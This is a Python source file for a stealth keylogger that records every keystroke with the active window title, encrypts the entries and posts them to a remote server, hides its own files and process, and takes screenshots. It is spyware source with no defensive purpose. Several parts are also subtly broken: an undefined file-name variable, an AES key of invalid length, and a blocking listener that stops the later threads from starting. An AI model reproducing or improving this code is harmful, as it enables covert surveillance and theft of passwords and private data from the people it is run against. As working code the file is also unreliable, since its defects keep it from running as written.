import pynput.keyboard
import os
import subprocess
import threading
import time
import uuid
import datetime
import base64
import pyaes
import requests
import win32gui
import win32process
import zipfile
import pyscreenshot as ImageGrab

LOG_DIR = os.path.join(os.getenv("APPDATA") if os.name == "nt" else os.getenv("HOME"), "Keylogger")
LOG_INTERVAL = 60  # Default log interval in seconds
LAST_LOG_TIME = time.time()
LOCK = threading.Lock()

# Key for AES encryption (must be 16, 24, or 32 bytes long)
AES_KEY = b'your_secret_AES_key'  # Change this to your own key

# Remote server URL to send logs
REMOTE_URL = 'https://example.com/log_keystrokes'

# Configuration options
CONFIG = {
    'log_file_location': os.path.join(LOG_DIR, "keylog_" + str(uuid.uuid4()) + ".txt"),
    'log_interval': LOG_INTERVAL,
    'keys_to_ignore': [],
    'stealth_mode': True,
    'compression': True,
    'logging_application_focus': True,
    'screenshot_capture': True,
    'encrypted_communication': True
}

# Function to write the keystrokes to a log file
def write_to_file(key):
    global LAST_LOG_TIME
    with LOCK:
        try:
            # Add timestamp and active window title
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            window_title = ""
            if CONFIG['logging_application_focus']:
                window_title = get_active_window_title()
            log_entry = f"[{timestamp}] [{window_title}] {key}\n"
            # Encrypt the log entry before sending
            encrypted_entry = encrypt(log_entry.encode())
            # Send encrypted log entry to remote server
            if CONFIG['encrypted_communication']:
                send_to_server(base64.b64encode(encrypted_entry).decode())
            else:
                send_to_server(encrypted_entry.decode())
            # Write to local log file
            with open(CONFIG['log_file_location'], "a") as f:
                f.write(log_entry)
            LAST_LOG_TIME = time.time()
        except Exception as e:
            # Log error to a separate file for better tracking
            with open("error_log.txt", "a") as error_file:
                error_file.write(f"Error writing to file: {e}\n")

# Function to encrypt data using AES
def encrypt(data):
    aes = pyaes.AESModeOfOperationCTR(AES_KEY)
    return aes.encrypt(data)

# Function to send log to remote server
def send_to_server(log):
    try:
        response = requests.post(REMOTE_URL, data={'log': log})
        if response.status_code != 200:
            raise Exception(f"Server returned non-200 status code: {response.status_code}")
    except Exception as e:
        # Log error to a separate file for better tracking
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error sending log to server: {e}\n")

# Function to create log directory
def create_log_dir():
    try:
        if not os.path.exists(LOG_DIR):
            os.makedirs(LOG_DIR)
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error creating log directory: {e}\n")

# Function to hide the console window
def hide_console():
    try:
        # Hide the console window on Windows systems
        if os.name == "nt":
            subprocess.call("attrib +h " + os.path.join(LOG_DIR, LOG_FILE_NAME), shell=True)
        # Hide the console window on Unix-based systems
        else:
            os.system("osascript -e 'tell application \"System Events\" to set visible of process \"Python\" to false'")
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error hiding console: {e}\n")

# Function to get the title of the active window
def get_active_window_title():
    window = win32gui.GetForegroundWindow()
    pid = win32process.GetWindowThreadProcessId(window)[1]
    handle = win32process.OpenProcess(0x0410, False, pid)
    title = win32gui.GetWindowText(window)
    return title

# Function to capture screenshot
def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        with open(os.path.join(LOG_DIR, "screenshot_" + str(uuid.uuid4()) + ".png"), "wb") as f:
            screenshot.save(f, "PNG")
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error capturing screenshot: {e}\n")

# Function to start the keylogger
def start_keylogger():
    try:
        # Create log directory
        create_log_dir()
        # Hide the console window if stealth mode is enabled
        if CONFIG['stealth_mode']:
            hide_console()
        # Create a listener for keyboard events
        with pynput.keyboard.Listener(on_press=write_to_file) as listener:
            # Start listening for keyboard events
            listener.join()
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error starting keylogger: {e}\n")

# Function to periodically check if it's time to log keystrokes
def check_log_time():
    global LAST_LOG_TIME
    while True:
        if time.time() - LAST_LOG_TIME >= CONFIG['log_interval']:
            write_to_file(" ")
        time.sleep(1)

# Function to compress logged data
def compress_logs():
    try:
        with zipfile.ZipFile(os.path.join(LOG_DIR, "logs.zip"), 'w') as zipf:
            for root, dirs, files in os.walk(LOG_DIR):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), LOG_DIR))
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error compressing logs: {e}\n")

if __name__ == "__main__":
    # Start the keylogger
    start_keylogger()
    # Start the thread to check log time periodically
    threading.Thread(target=check_log_time, daemon=True).start()
    # Start the thread to capture screenshots
    if CONFIG['screenshot_capture']:
        threading.Thread(target=capture_screenshot, daemon=True).start()
    # Start the thread to compress logs
    if CONFIG['compression']:
        threading.Thread(target=compress_logs, daemon=True).start()
